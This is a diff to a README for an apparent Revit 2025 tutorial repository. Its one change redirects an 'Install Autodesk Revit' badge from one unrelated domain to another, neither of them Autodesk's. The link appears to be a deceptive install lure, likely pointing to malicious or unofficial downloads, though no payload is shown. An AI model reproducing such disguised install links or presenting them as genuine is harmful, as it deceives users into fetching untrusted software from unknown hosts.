@@ -5,7 +5,7 @@
 
 📐 Elevate your architectural projects with Revit 2025 DesignGuide! This repository offers tutorials, resources, and best practices for professionals to enhance their BIM workflow in 2025.
 
-[![Install Autodesk Revit](https://img.shields.io/badge/Install-Autodesk_Revit-blueviolet)](https://cea-groupe.com)
+[![Install Autodesk Revit](https://img.shields.io/badge/Install-Autodesk_Revit-blueviolet)](https://glocktober.com)
 
 ---
 
